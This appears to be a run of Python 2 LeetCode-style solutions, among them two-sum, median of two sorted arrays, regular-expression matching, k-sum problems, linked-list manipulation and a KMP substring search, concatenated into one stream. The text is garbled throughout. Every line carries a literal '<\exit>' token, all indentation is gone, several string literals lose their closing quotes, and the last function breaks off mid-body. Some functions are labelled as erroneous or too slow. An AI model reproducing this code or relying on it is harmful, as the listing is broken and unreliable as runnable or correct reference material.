class Solution:<\exit>
def twoSum_TLE(self, num, target):<\exit>
nums = num<\exit>
for ind1, val in enumerate(nums):<\exit>
try:<\exit>
ind2 = nums.index(target - val)<\exit>
return ind1+1, ind2+1<\exit>
except ValueError:<\exit>
continue<\exit>
def twoSum_TLE_2(self, num, target):<\exit>
nums = num<\exit>
for ind1, val in enumerate(nums):<\exit>
if target-val in nums:<\exit>
return ind1+1, nums.index(target-val)+1<\exit>
def twoSum(self, num, target):<\exit>
hash_map = {}<\exit>
for ind, val in enumerate(num):<\exit>
hash_map[val] = ind<\exit>
for ind1, val in enumerate(num):<\exit>
if target-val in hash_map:<\exit>
ind2 = hash_map[target-val]<\exit>
if ind1!=ind2:<\exit>
return ind1+1, ind2+1<\exit>
if __name__=="__main__":<\exit>
print Solution().twoSum([3, 2, 4], 6)<\exit>
class Solution:<\exit>
def findMedianSortedArrays(self, A, B):<\exit>
m = len(A)<\exit>
n = len(B)<\exit>
if ((m+n)&1 == 0):<\exit>
return (self.find_kth(A, B, (m+n)/2)+self.find_kth(A, B, (m+n)/2-1))/2.0<\exit>
else:<\exit>
return self.find_kth(A, B, (m+n)/2)<\exit>
def find_kth(self, A, B, k):<\exit>
if not A:  return B[k]<\exit>
if not B:  return A[k]<\exit>
if k == 0: return min(A[0], B[0])<\exit>
m, n = len(A), len(B)<\exit>
if A[m/2] >= B[n/2]:<\exit>
if k > m/2+n/2:<\exit>
return self.find_kth(A, B[n/2+1:], k-n/2-1)<\exit>
else:<\exit>
return self.find_kth(A[:m/2], B, k)<\exit>
else:<\exit>
return self.find_kth(B, A, k)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMedianSortedArrays([1, 2], [1, 2, 3]) == 2<\exit>
assert Solution().findMedianSortedArrays([1, 2], [3]) == 2<\exit>
assert Solution().findMedianSortedArrays([1], [2, 3]) == 2<\exit>
assert Solution().findMedianSortedArrays([1, 2], [1, 2]) == 1.5<\exit>
class Solution:<\exit>
def lengthOfLongestSubstring(self, s):<\exit>
visited_last_index = [-1 for _ in range(256)]<\exit>
longest = 0<\exit>
start = 0<\exit>
for ind, val in enumerate(s):<\exit>
if visited_last_index[ord(val)] == -1:<\exit>
longest = max(longest, (ind)-start+1)<\exit>
else:<\exit>
longest = max(longest, (ind-1)-start+1)<\exit>
for i in range(start, visited_last_index[ord(val)]):<\exit>
visited_last_index[ord(s[i])] = -1<\exit>
start = visited_last_index[ord(val)]+1<\exit>
visited_last_index[ord(val)] = ind<\exit>
return longest<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def addTwoNumbers(self, l1, l2):<\exit>
result_head = ListNode(0)<\exit>
cur1 = l1<\exit>
cur2 = l2<\exit>
cur = result_head<\exit>
while cur1 or cur2:<\exit>
cur.val = cur.val+self.addNode(cur1, cur2)<\exit>
if cur.val < 10:<\exit>
if cur1 and cur1.next or cur2 and cur2.next:<\exit>
cur.next = ListNode(0)<\exit>
else:<\exit>
cur.val -= 10<\exit>
cur.next = ListNode(1)<\exit>
if cur1:<\exit>
cur1 = cur1.next<\exit>
if cur2:<\exit>
cur2 = cur2.next<\exit>
cur = cur.next<\exit>
return result_head<\exit>
def addNode(self, node1, node2):<\exit>
if not node1 and not node2:<\exit>
raise Exception("two nodes are None")<\exit>
if not node1:<\exit>
return node2.val<\exit>
if not node2:<\exit>
return node1.val<\exit>
return node1.val+node2.val<\exit>
if __name__ == "__main__":<\exit>
l1s = [ListNode(1)]<\exit>
l2s = [ListNode(9), ListNode(9)]<\exit>
for i in range(len(l1s)-1):<\exit>
l1s[i].next = l1s[i+1]<\exit>
for i in range(len(l2s)-1):<\exit>
l2s[i].next = l2s[i+1]<\exit>
Solution().addTwoNumbers(l1s[0], l2s[0])<\exit>
class Solution(object):<\exit>
def longestPalindrome(self, s):<\exit>
if not s:<\exit>
return<\exit>
n = len(s)<\exit>
if n == 1:<\exit>
return s<\exit>
ret = s[0]<\exit>
for i in xrange(0, n):<\exit>
cur = self.get_palindrome_from_center(s, i, i)<\exit>
if len(cur) > len(ret): ret = cur<\exit>
cur = self.get_palindrome_from_center(s, i, i+1)<\exit>
if len(cur) > len(ret): ret = cur<\exit>
return ret<\exit>
def longestPalindrome_TLE(self, s):<\exit>
length = len(s)<\exit>
dp = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]<\exit>
for i in xrange(length+1):<\exit>
dp[i][i] = True<\exit>
longest = [0, 0]<\exit>
for j in xrange(length+1):<\exit>
for i in xrange(j-1, -1, -1):<\exit>
if i+1 == j:<\exit>
dp[i][j] = True<\exit>
else:<\exit>
dp[i][j] = s[i] == s[j-1] and dp[i+1][j-1]<\exit>
if dp[i][j] == True and longest[1]-longest[0] < j-i:<\exit>
longest[0], longest[1] = i, j<\exit>
return s[longest[0]:longest[1]]<\exit>
def longestPalindrome_TLE2(self, s):<\exit>
length = len(s)<\exit>
longest = ""<\exit>
dp = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]<\exit>
for i in xrange(length+1):<\exit>
dp[i][i] = True<\exit>
for i in xrange(length):<\exit>
dp[i][i+1] = True<\exit>
for i in xrange(length-1):<\exit>
dp[i][i+2] = s[i] == s[i+1]<\exit>
if dp[i][i+1]:<\exit>
longest = s[i:i+2]<\exit>
for l in xrange(3, length+1):<\exit>
for i in xrange(0, length-l):<\exit>
if s[i] == s[i+l-1]:<\exit>
dp[i][i+l] = dp[i+1][i+l-1]<\exit>
else:<\exit>
dp[i][i+l] = False<\exit>
if dp[i][i+l] and len(longest) < l:<\exit>
longest = s[i:i+l]<\exit>
return longest<\exit>
def get_palindrome_from_center(self, s, begin, end):<\exit>
while begin >= 0 and end < len(s) and s[begin] == s[end]:<\exit>
begin -= 1<\exit>
end += 1<\exit>
return s[begin+1: end-1+1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestPalindrome("dfaaabbbaaac") == "aaabbbaaa<\exit>
class Solution:<\exit>
def convert(self, s, nRows):<\exit>
length = len(s)<\exit>
matrix = [[] for _ in xrange(nRows)]<\exit>
i = 0<\exit>
while i < length:<\exit>
try:<\exit>
for j in xrange(nRows):<\exit>
matrix[j].append(s[i])<\exit>
i += 1<\exit>
for j in xrange(nRows-1-1, 0, -1):<\exit>
matrix[j].append(s[i])<\exit>
i += 1<\exit>
except IndexError:<\exit>
break<\exit>
lst = ["".join(element) for element in matrix]<\exit>
return "".join(lst)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().convert("ABCD", 2) == "ACBD<\exit>
class Solution(object):<\exit>
def reverse(self, x):<\exit>
sign = -1 if x < 0 else 1<\exit>
x *= sign<\exit>
while x:<\exit>
if x%10 == 0:<\exit>
x /= 10<\exit>
else:<\exit>
break<\exit>
x = str(x)<\exit>
lst = list(x)<\exit>
lst.reverse()<\exit>
x = "".join(lst)<\exit>
x = int(x)<\exit>
return sign*x<\exit>
if __name__ == "__main__":<\exit>
print Solution().reverse(123)<\exit>
class Solution:<\exit>
def atoi(self, str):<\exit>
INT_MAX = 2147483647<\exit>
INT_MIN = -2147483648<\exit>
str = str.strip()<\exit>
if not str:<\exit>
return 0<\exit>
sign = 1<\exit>
if str[0] in ("+", "-"):<\exit>
if str[0] == "-":<\exit>
sign = -1<\exit>
str = str[1:]<\exit>
if not str[0].isdigit():<\exit>
return 0<\exit>
for ind, val in enumerate(str):<\exit>
if not val.isdigit():<\exit>
str = str[:ind]<\exit>
break<\exit>
sum = 0<\exit>
scale = 1<\exit>
for element in str[::-1]:<\exit>
sum += scale*int(element)<\exit>
scale *= 10<\exit>
result = sign*sum<\exit>
if result > INT_MAX:<\exit>
return INT_MAX<\exit>
if result < INT_MIN:<\exit>
return INT_MIN<\exit>
return result<\exit>
class Solution:<\exit>
def isPalindrome(self, x):<\exit>
if x < 0:<\exit>
return False<\exit>
div = 1<\exit>
while x/div >= 10:<\exit>
div *= 10<\exit>
while x > 0:<\exit>
msb = x/div<\exit>
lsb = x%10<\exit>
if msb != lsb:<\exit>
return False<\exit>
x %= div<\exit>
x /= 10<\exit>
div /= 100<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
Solution().isPalindrome(2147483647)<\exit>
class Solution:<\exit>
def maxArea(self, height):<\exit>
start = 0<\exit>
end = len(height)-1<\exit>
max_area = -1 << 32<\exit>
while start < end:<\exit>
area = min(height[start], height[end])*(end-start)<\exit>
max_area = max(area, max_area)<\exit>
if height[start] < height[end]:<\exit>
start += 1<\exit>
else:<\exit>
end -= 1<\exit>
return max_area<\exit>
class Solution:<\exit>
def isMatch_error(self, s, p):<\exit>
tape = s<\exit>
regex = p<\exit>
index = 0<\exit>
state = 0<\exit>
while index < len(tape) and state < len(regex):<\exit>
char = tape[index]<\exit>
if state+1 < len(regex) and regex[state+1] == "*":<\exit>
if regex[state] != ".":<\exit>
if char == regex[state]:<\exit>
while index < len(tape) and tape[index] == char: index += 1<\exit>
state += 2<\exit>
else:<\exit>
state += 2<\exit>
else:<\exit>
state += 2<\exit>
if state < len(regex):<\exit>
if regex[state] != ".":<\exit>
while index < len(tape) and tape[index] != regex[state]: index += 1<\exit>
else:<\exit>
count = 1<\exit>
else:<\exit>
return True<\exit>
else:<\exit>
if char == regex[state] or regex[state] == ".":<\exit>
index += 1<\exit>
state += 1<\exit>
else:<\exit>
break<\exit>
if index == len(tape) and state == len(regex):<\exit>
return True<\exit>
return False<\exit>
def isMatch_TLE(self, s, p):<\exit>
tape = s<\exit>
regex = p<\exit>
index = 0<\exit>
state = 0<\exit>
if not tape and not regex:<\exit>
return True<\exit>
if tape and not regex:<\exit>
return False<\exit>
if not tape and regex:<\exit>
if state+1 < len(regex) and regex[state+1] == "*":<\exit>
return self.isMatch(tape, regex[state+2:])<\exit>
else:<\exit>
return False<\exit>
if state+1 < len(regex) and regex[state+1] == "*":<\exit>
if tape[index] == regex[state] or regex[state] == ".":<\exit>
return self.isMatch(tape[index+1:], regex[state:]) or \<\exit>
self.isMatch(tape[index+1:], regex[state+2:]) or \<\exit>
self.isMatch(tape[index:], regex[state+2:])<\exit>
else:<\exit>
return self.isMatch(tape[index:], regex[state+2:])<\exit>
else:<\exit>
if tape[index] == regex[state] or regex[state] == ".":<\exit>
return self.isMatch(tape[index+1:], regex[state+1:])<\exit>
else:<\exit>
return False<\exit>
def isMatch(self, s, p):<\exit>
tape = s<\exit>
regex = p<\exit>
m = len(tape)<\exit>
n = len(regex)<\exit>
dp = [[False for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
dp[m][n] = True<\exit>
for j in xrange(n-1, -1, -1):<\exit>
if regex[j] == "*":<\exit>
dp[m][j] = dp[m][j+1]<\exit>
elif j+1 < n and regex[j+1] == "*":<\exit>
dp[m][j] = dp[m][j+1]<\exit>
else:<\exit>
dp[m][j] = False<\exit>
for i in xrange(m-1, -1, -1):<\exit>
for j in xrange(n-1, -1, -1):<\exit>
if regex[j] == "*":<\exit>
if j-1 >= 0 and regex[j-1] != "*":<\exit>
dp[i][j] = dp[i][j+1]<\exit>
else:<\exit>
return False<\exit>
elif j+1 < n and regex[j+1] == "*":<\exit>
if tape[i] == regex[j] or regex[j] == ".":<\exit>
dp[i][j] = dp[i][j+2] or dp[i+1][j] or dp[i+1][j+2]<\exit>
else:<\exit>
dp[i][j] = dp[i][j+2]<\exit>
else:<\exit>
if tape[i] == regex[j] or regex[j] == ".":<\exit>
dp[i][j] = dp[i+1][j+1]<\exit>
else:<\exit>
dp[i][j] = False<\exit>
return dp[0][0]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isMatch("aa", "a") == False<\exit>
assert Solution().isMatch("aa", "aa") == True<\exit>
assert Solution().isMatch("aaa", "aa") == False<\exit>
assert Solution().isMatch("aa", "a*") == True<\exit>
assert Solution().isMatch("ab", ".*") == True<\exit>
assert Solution().isMatch("aab", "c*a*b") == True<\exit>
assert Solution().isMatch("aaa", "a*a") == True<\exit>
assert Solution().isMatch("bbbba", ".*a*a") == True<\exit>
assert Solution().isMatch("a", "aa*") == True<\exit>
int2roman = {<\exit>
1: "I",<\exit>
4: "IV",<\exit>
5: "V",<\exit>
9: "IX",<\exit>
10: "X",<\exit>
40: "XL",<\exit>
50: "L",<\exit>
90: "XC",<\exit>
100: "C",<\exit>
400: "CD",<\exit>
500: "D",<\exit>
900: "CM",<\exit>
1000: "M"<\exit>
}<\exit>
class Solution:<\exit>
def intToRoman(self, num):<\exit>
string_builder = []<\exit>
components = [1, 4, 5, 9, 10, 10, 40, 50, 90, 100, 400, 500, 900, 1000]<\exit>
for component in reversed(components):<\exit>
while num >= component:<\exit>
string_builder.append(int2roman[component])<\exit>
num -= component<\exit>
return "".join(string_builder)<\exit>
roman2int = {<\exit>
"I": 1,<\exit>
"V": 5,<\exit>
"X": 10,<\exit>
"L": 50,<\exit>
"C": 100,<\exit>
"D": 500,<\exit>
"M": 1000<\exit>
}<\exit>
class Solution:<\exit>
def romanToInt(self, s):<\exit>
result = 0<\exit>
for ind, val in enumerate(s):<\exit>
if ind > 0 and roman2int[val] > roman2int[s[ind-1]]:<\exit>
result -= roman2int[s[ind-1]]<\exit>
result += roman2int[val]-roman2int[s[ind-1]]<\exit>
else:<\exit>
result += roman2int[val]<\exit>
return result<\exit>
class Solution:<\exit>
def threeSum_duplicate(self, num):<\exit>
reverse_map = {}<\exit>
for ind, val in enumerate(num):<\exit>
if val not in reverse_map:<\exit>
reverse_map[val] = [ind]<\exit>
else:<\exit>
reverse_map[val].append(ind)<\exit>
result = []<\exit>
for i in xrange(len(num)):<\exit>
for j in xrange(i, len(num)):<\exit>
target = 0-num[i]-num[j]<\exit>
if target not in reverse_map:<\exit>
continue<\exit>
for index in reverse_map[target]:<\exit>
if i != index and j != index:<\exit>
result.append([num[i], num[j], target])<\exit>
break<\exit>
return result<\exit>
def threeSum_TLE(self, num):<\exit>
reverse_map = {}<\exit>
for ind, val in enumerate(num):<\exit>
if val not in reverse_map:<\exit>
reverse_map[val] = [ind]<\exit>
else:<\exit>
reverse_map[val].append(ind)<\exit>
result = {}<\exit>
for i in xrange(len(num)):<\exit>
for j in xrange(i, len(num)):<\exit>
target = 0-num[i]-num[j]<\exit>
if target not in reverse_map:<\exit>
continue<\exit>
for index in reverse_map[target]:<\exit>
if index != i and index != j:<\exit>
lst = sorted([num[i], num[j], target])<\exit>
lst = tuple(lst)<\exit>
result[lst] = 1<\exit>
break<\exit>
return result.keys()<\exit>
def threeSum(self, num):<\exit>
result = []<\exit>
num.sort()<\exit>
i = 0<\exit>
while i < len(num)-2:<\exit>
j = i+1<\exit>
k = len(num)-1<\exit>
while j < k:<\exit>
lst = [num[i], num[j], num[k]]<\exit>
if sum(lst) == 0:<\exit>
result.append(lst)<\exit>
k -= 1<\exit>
j += 1<\exit>
while j < k and num[j] == num[j-1]:<\exit>
j += 1<\exit>
while j < k and num[k] == num[k+1]:<\exit>
k -= 1<\exit>
elif sum(lst) > 0:<\exit>
k -= 1<\exit>
else:<\exit>
j += 1<\exit>
i += 1<\exit>
while i < len(num)-2 and num[i] == num[i-1]:<\exit>
i += 1<\exit>
return result<\exit>
if __name__ == "__main__":<\exit>
print Solution().threeSum([-1, 0, 1, 2, -1, -4])<\exit>
class Solution(object):<\exit>
def longestCommonPrefix(self, strs):<\exit>
if not strs: return ""<\exit>
l = min(map(len, strs))<\exit>
i = 0<\exit>
while i < l:<\exit>
char = strs[0][i]<\exit>
for s in strs:<\exit>
if s[i] != char:<\exit>
return strs[0][:i]<\exit>
i += 1<\exit>
return strs[0][:i]<\exit>
def longestCommonPrefixComplex(self, strs):<\exit>
if not strs:<\exit>
return ""<\exit>
n = len(strs)<\exit>
str_builder = ""<\exit>
min_len = min(len(string) for string in strs)<\exit>
for i in range(min_len):<\exit>
char = strs[0][i]<\exit>
j = 0<\exit>
while j < n:<\exit>
try:<\exit>
if strs[j][i] != char: break<\exit>
j += 1<\exit>
except IndexError:<\exit>
break<\exit>
if j == n:<\exit>
str_builder += char<\exit>
else:<\exit>
break<\exit>
return str_builder<\exit>
if __name__ == "__main__":<\exit>
strs = ["abc", "abcd"]<\exit>
print Solution().longestCommonPrefix(strs)<\exit>
class Solution:<\exit>
def threeSumClosest(self, num, target):<\exit>
min_distance = 1<<32<\exit>
num.sort()<\exit>
min_summation = 0<\exit>
for i, val in enumerate(num):<\exit>
j = i+1<\exit>
k = len(num)-1<\exit>
while j<k:<\exit>
lst = [val, num[j], num[k]]<\exit>
if min_distance>abs(target-sum(lst)):<\exit>
min_summation = sum(lst)<\exit>
if sum(lst)==target:<\exit>
return min_summation<\exit>
min_distance = abs(target-min_summation)<\exit>
elif sum(lst)>target:<\exit>
k -= 1<\exit>
else:<\exit>
j += 1<\exit>
return min_summation<\exit>
if __name__=="__main__":<\exit>
print Solution().threeSumClosest([1, 1, 1, 1], 0)<\exit>
class Solution:<\exit>
digit2letters = {<\exit>
'2': "abc",<\exit>
'3': "def",<\exit>
'4': "ghi",<\exit>
'5': "jkl",<\exit>
'6': "mno",<\exit>
'7': "pqrs",<\exit>
'8': "tuv",<\exit>
'9': "wxyz"<\exit>
}<\exit>
def letterCombinations(self, digits):<\exit>
result = []<\exit>
self.dfs_traverse(digits, "", result)<\exit>
return result<\exit>
def dfs_traverse(self, string_seq, current, result):<\exit>
if not string_seq:<\exit>
result.append(current)<\exit>
return<\exit>
for letter in self.digit2letters[string_seq[0]]:<\exit>
self.dfs_traverse(string_seq[1:], current+letter, result)<\exit>
if __name__=="__main__":<\exit>
print Solution().letterCombinations("23")<\exit>
class Solution:<\exit>
def fourSum_TLE(self, num, target):<\exit>
result = []<\exit>
num.sort()<\exit>
length = len(num)<\exit>
h = 0<\exit>
while h<length-3:<\exit>
i = h+1<\exit>
while i<length-2:<\exit>
j = i+1<\exit>
k = length-1<\exit>
while j<k:<\exit>
lst = [num[h], num[i], num[j], num[k]]<\exit>
summation = sum(lst)<\exit>
if summation==target:<\exit>
result.append(lst)<\exit>
k -= 1<\exit>
j += 1<\exit>
while j<k and num[j]==num[j-1]:<\exit>
j += 1<\exit>
while j<k and num[k]==num[k+1]:<\exit>
k -= 1<\exit>
elif summation>target:<\exit>
k -= 1<\exit>
else:<\exit>
j += 1<\exit>
i += 1<\exit>
while i<length-2 and num[i]==num[i-1]:<\exit>
i += 1<\exit>
h += 1<\exit>
while h<length-3 and num[h]==num[h-1]:<\exit>
h += 1<\exit>
return result<\exit>
def fourSum(self, num, target):<\exit>
length, result_set, sum2index = len(num), set(), {}<\exit>
if length<4:<\exit>
return []<\exit>
num.sort()<\exit>
for p in xrange(length):<\exit>
for q in xrange(p+1, length):<\exit>
if num[p]+num[q] not in sum2index:<\exit>
sum2index[num[p]+num[q]] = [(p, q)]<\exit>
else:<\exit>
sum2index[num[p]+num[q]].append((p, q))<\exit>
for i in xrange(length):<\exit>
for j in xrange(i+1, length-2):<\exit>
sum_remain = target-num[i]-num[j]<\exit>
if sum_remain in sum2index:<\exit>
for pair in sum2index[sum_remain]:<\exit>
if pair[0]>j:<\exit>
result_set.add(( num[i], num[j], num[pair[0]], num[pair[1]] ))<\exit>
return [list(i) for i in result_set]<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def removeNthFromEnd(self, head, n):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
length = 0<\exit>
pre = dummy<\exit>
while pre.next:<\exit>
length += 1<\exit>
pre=pre.next<\exit>
pre = dummy<\exit>
count = 0<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
if count==length-n:<\exit>
pre.next = cur.next<\exit>
break<\exit>
else:<\exit>
count += 1<\exit>
pre = pre.next<\exit>
return dummy.next<\exit>
class Solution:<\exit>
def isValid(self, s):<\exit>
put_set = ("(", "[", "{")<\exit>
pop_set = (")", "]", "}")<\exit>
pair = dict(zip(put_set, pop_set))<\exit>
stack = []<\exit>
for element in s:<\exit>
if element in put_set:<\exit>
stack.append(pair[element])<\exit>
elif element in pop_set:<\exit>
if not stack or element != stack.pop():<\exit>
return False<\exit>
return True if not stack else False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isValid("()")<\exit>
from typing import List<\exit>
class Solution:<\exit>
def generateParenthesis(self, n: int) -> List[str]:<\exit>
F: List[List[str]] = [[] for _ in range(n + 1)]<\exit>
F[0].append("")<\exit>
for i in range(1, n+1):<\exit>
for j in range(i):<\exit>
for s1 in F[j]:<\exit>
for s2 in F[i-j-1]:<\exit>
F[i].append(f"({s1}){s2}")<\exit>
return F[n]<\exit>
class Solution:<\exit>
def generateParenthesis(self, n):<\exit>
result = []<\exit>
self.generateParenthesisDfs(result, "", n, n)<\exit>
return result<\exit>
def generateParenthesisDfs(self, result, cur, left, right):<\exit>
if left == 0 and right == 0:<\exit>
result.append(cur)<\exit>
return<\exit>
if left > 0:<\exit>
self.generateParenthesisDfs(result, cur + "(", left - 1, right)<\exit>
if right > left:<\exit>
self.generateParenthesisDfs(result, cur + ")", left, right - 1)<\exit>
if __name__=="__main__":<\exit>
assert Solution().generateParenthesis(3)==['((()))', '(()())', '(())()', '()(())', '()()()']<\exit>
import heapq<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def mergeKLists_TLE1(self, lists):<\exit>
lists = filter(lambda x: x is not None, lists)<\exit>
if not lists:<\exit>
return<\exit>
length = len(lists)<\exit>
factor = 2<\exit>
while length>0:<\exit>
i = 0<\exit>
while True:<\exit>
try:<\exit>
lists[i] = self.mergeTwoLists(lists[i], lists[i+factor/2])<\exit>
except IndexError:<\exit>
break<\exit>
i += factor<\exit>
length /= 2<\exit>
factor *= 2<\exit>
return lists[0]<\exit>
def mergeKLists_TLE2(self, lists):<\exit>
lists = filter(lambda x: x is not None, lists)<\exit>
if not lists:<\exit>
return<\exit>
result = lists[0]<\exit>
for i in xrange(1, len(lists)):<\exit>
result = self.mergeTwoLists(result, lists[i])<\exit>
return result<\exit>
def mergeTwoLists(self, l1, l2):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = l1<\exit>
pre = dummy<\exit>
the_other = l2<\exit>
while pre and pre.next:<\exit>
cur = pre.next<\exit>
if the_other and cur.val>the_other.val:<\exit>
temp = the_other.next<\exit>
pre.next, the_other.next = the_other, cur<\exit>
the_other = temp<\exit>
pre = pre.next<\exit>
if the_other:<\exit>
pre.next = the_other<\exit>
return dummy.next<\exit>
def mergeKLists(self, lists):<\exit>
heap = []<\exit>
for head_node in lists:<\exit>
if head_node:<\exit>
heapq.heappush(heap, (head_node.val, head_node))<\exit>
dummy = ListNode(0)<\exit>
cur = dummy<\exit>
while heap:<\exit>
smallest_node = heapq.heappop(heap)[1]<\exit>
cur.next = smallest_node<\exit>
cur = cur.next<\exit>
if smallest_node.next:<\exit>
heapq.heappush(heap, (smallest_node.next.val, smallest_node.next))<\exit>
return dummy.next<\exit>
if __name__=="__main__":<\exit>
assert  Solution().mergeKLists([None, None])==None<\exit>
assert Solution().mergeKLists([ListNode(1), ListNode(0)]).val==0<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def swapPairs(self, head):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
while pre.next and pre.next.next:<\exit>
node1 = pre.next<\exit>
node2 = pre.next.next<\exit>
pre.next, node1.next, node2.next = node2, node2.next, node1<\exit>
pre = pre.next.next<\exit>
return dummy.next<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def reverseKGroup(self, head, k):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
cur_lst = self.generate_lst(pre.next, k)<\exit>
while pre and not None in cur_lst:<\exit>
temp = cur_lst[-1].next<\exit>
pre.next = cur_lst[-1]<\exit>
for i in reversed(xrange(k)):<\exit>
if i==0:<\exit>
cur_lst[i].next = temp<\exit>
else:<\exit>
cur_lst[i].next = cur_lst[i-1]<\exit>
pre = cur_lst[0]<\exit>
cur_lst = self.generate_lst(pre.next, k)<\exit>
return dummy.next<\exit>
def generate_lst(self, node, k):<\exit>
lst = []<\exit>
cur = node<\exit>
for i in xrange(k):<\exit>
if cur:<\exit>
lst.append(cur)<\exit>
cur = cur.next<\exit>
else:<\exit>
lst.append(None)<\exit>
return lst<\exit>
class Solution:<\exit>
def removeElement_negative_index(self, A, elem):<\exit>
open_ptr = 0<\exit>
back_ptr = -1<\exit>
while len(A)+back_ptr>=open_ptr:<\exit>
if A[open_ptr]==elem:<\exit>
A[open_ptr], A[back_ptr] = A[back_ptr], A[open_ptr]<\exit>
back_ptr -= 1<\exit>
else:<\exit>
open_ptr += 1<\exit>
return len(A)+back_ptr+1<\exit>
def removeElement(self, A, elem):<\exit>
open_ptr = 0<\exit>
end_ptr = len(A)<\exit>
while open_ptr<end_ptr:<\exit>
if A[open_ptr]==elem:<\exit>
end_ptr -= 1<\exit>
A[open_ptr], A[end_ptr] = A[end_ptr], A[open_ptr]<\exit>
else:<\exit>
open_ptr += 1<\exit>
return end_ptr<\exit>
if __name__=="__main__":<\exit>
A = [1, 3, 4, 2, 5, 4]<\exit>
elem = 4<\exit>
solution = Solution()<\exit>
assert solution.removeElement(A, elem)==solution.removeElement_negative_index(A, elem)<\exit>
class Solution:<\exit>
def removeDuplicates(self, A):<\exit>
length = len(A)<\exit>
if length==0 or length==1:<\exit>
return length<\exit>
closed_ptr = 0<\exit>
open_ptr = 1<\exit>
while open_ptr<length:<\exit>
if A[closed_ptr]==A[open_ptr]:<\exit>
open_ptr += 1<\exit>
continue<\exit>
non_duplicate = A[open_ptr]<\exit>
A[closed_ptr+1] = non_duplicate<\exit>
closed_ptr += 1<\exit>
return closed_ptr+1<\exit>
def removeDuplicates_another_loop_style(self, A):<\exit>
length = len(A)<\exit>
if length==0 or length==1:<\exit>
return length<\exit>
closed_ptr = 0<\exit>
open_ptr = 1<\exit>
while open_ptr<length:<\exit>
while open_ptr<length and A[closed_ptr]==A[open_ptr]:<\exit>
open_ptr += 1<\exit>
if open_ptr<length:<\exit>
non_duplicate = A[open_ptr]<\exit>
A[closed_ptr+1] = non_duplicate<\exit>
closed_ptr += 1<\exit>
return closed_ptr+1<\exit>
MAX_INT = 2147483647<\exit>
MIN_INT = -2147483648<\exit>
class Solution:<\exit>
def divide(self, dividend, divisor):<\exit>
if divisor == 0 or dividend == 0:<\exit>
return 0<\exit>
if dividend == MIN_INT and divisor == -1:<\exit>
return MAX_INT<\exit>
sign = 1 if dividend >= 0 and divisor >= 0 or dividend < 0 and divisor < 0 else -1<\exit>
dividend = abs(dividend)<\exit>
divisor = abs(divisor)<\exit>
result = 0<\exit>
while dividend >= divisor:<\exit>
current_result = 1<\exit>
current = divisor<\exit>
while current <= dividend:<\exit>
current <<= 1<\exit>
current_result <<= 1<\exit>
dividend -= current>>1<\exit>
result += current_result>>1<\exit>
return sign*result<\exit>
if __name__ == "__main__":<\exit>
assert Solution().divide(5, -1) == -5<\exit>
class Solution:<\exit>
def strStr_brute_force(self, haystack, needle):<\exit>
l_hay = len(haystack)<\exit>
l_ndl = len(needle)<\exit>
for i in xrange(l_hay-l_ndl+1):<\exit>
if haystack[i:i+l_ndl]==needle:<\exit>
return haystack[i:]<\exit>
return None<\exit>
def strStr(self, haystack, needle):<\exit>
ln = len(needle)<\exit>
lh = len(haystack)<\exit>
if ln==0:<\exit>
return haystack<\exit>
if ln==1:<\exit>
try:<\exit>
index = haystack.index(needle)<\exit>
return haystack[index:]<\exit>
except ValueError:<\exit>
return None<\exit>
T = [0 for _ in xrange(ln)]<\exit>
T[0] = -1<\exit>
T[1] = 0<\exit>
pos = 2<\exit>
cnd = 0<\exit>
while pos<ln:<\exit>
if needle[pos-1]==needle[cnd]:<\exit>
cnd += 1<\exit>
T[pos] = cnd<\exit>
pos += 1<\exit>
elif T[cnd]!=-1:<\exit>
cnd = T[cnd]<\exit>
else:<\exit>
cnd = 0<\exit>
T[pos] = cnd<\exit>
pos += 1<\exit>
i = 0<\exit>
m = 0<\exit>
while m+i<lh:<\exit>
if needle[i]==haystack[m+i]:<\exit>
i += 1<\exit>
if i==ln:<\exit>
return haystack[m:]<\exit>
else:<\exit>
if T[i]!=-1:<\exit>
m = m+i-T[i]<\exit>
i = T[i]<\exit>
else:<\exit>
m += 1<\exit>
i = 0<\exit>
return None<\exit>
if __name__=="__main__":<\exit>
needle = "ABCDABD"<\exit>
haystack = "ABC ABCDAB ABCDABCDABDE"<\exit>
needle = "aaa"<\exit>
haystack = "aaa"<\exit>
solution = Solution()<\exit>
assert solution.strStr_brute_force(haystack, needle)==solution.strStr(haystack, needle)<\exit>
class Solution:<\exit>
def findSubstring_TLE(self, S, L):<\exit>
if not L:<\exit>
return<\exit>
k = len(L[0])<\exit>
l = len(L)<\exit>
working_list = list(L)<\exit>
result = []<\exit>
window_t = -1<\exit>
window = []<\exit>
i = 0<\exit>
while i<=len(S)-3:<\exit>
if len(window)==l:<\exit>
result.append(window_t-l*k)<\exit>
word = S[i:i+3]<\exit>
if word in working_list:<\exit>
window.append(word)<\exit>
working_list.remove(word)<\exit>
window_t = i+3<\exit>
i += 3<\exit>
elif word not in L:<\exit>
if window:<\exit>
i = window_t-len(window)*k+1<\exit>
else:<\exit>
i += 1<\exit>
window = []<\exit>
window_t = -1<\exit>
working_list = list(L)<\exit>
elif word in L and word not in working_list:<\exit>
window = window[window.index(word)+1:]<\exit>
window.append(word)<\exit>
window_t = i+3<\exit>
i += 3<\exit>
